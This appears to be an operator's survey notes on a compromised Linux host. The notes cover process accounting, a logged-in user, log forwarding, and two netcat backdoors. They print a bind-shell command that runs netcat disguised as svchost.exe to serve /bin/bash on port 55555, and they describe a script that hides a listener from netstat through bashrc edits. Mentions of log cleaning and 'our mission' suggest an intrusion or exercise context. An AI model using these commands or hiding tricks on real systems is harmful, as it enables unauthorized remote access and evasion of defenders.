*Recommendation - Process accounting is active on this system. I would proceed with caution. Since we are only using this device for survey collection and scanning, risk is moderate.

*User logged in - radicle
*Access Time - 2022-08-24 12:32
*Access Method - tty1

*User - radicle
*File type - binary
Supporting files - N/A
Associated Logs - N/A
Network connection - port 55555
Identifiable text: svchost.exe
Modules loaded by malware
*Persistence (mechanism and location) - radicle user is running this on its bash shell
*Documentation - http://netcat.sourceforge.net/
*Description - /bin/svchost.exe -knlvp 55555 -e /bin/bash --- this command is listening on any device on port 55555 to give the external device a bash shell. This is some form of a persistence/backdoor mechanism possibly placed by a malicious actor.
*Recommendation - I recommend that we watch for any connection on port 55555 via netstat. For now, it does not pose a threat to our mission.

*Description - T6 is sending logs to a remote host T5. It is sending mail and news.none logs. There is a exim4 running on loopback so I think it is just creating maillogs for the purpose of creating logs.
*Recommendation - We have access to .201. Log cleaning may not necessary since it is only sending mail logs. Low risk.

Network connection - netcat listener via port 13666
Identifiable text
Modules loaded by malware
*Persistence (mechanism and location) - scripted root level commands but it is not properly set up in cron...
*Documentation - None, it looks like a script made privately. http://netcat.sourceforge.net/
*Description - Malice is not set to run anywhere. However,  when it runs, it opens up a netcat listener on port 13666. It also edits the bashrc files of all users so that everytime someone runs netstat the netcat connection is hidden.
*Recommendation - This malicious file is a persistence backdoor mechanism. This proves that there were malicious actors on this device. However, since there is no evidence of this running, we can proceed for now.
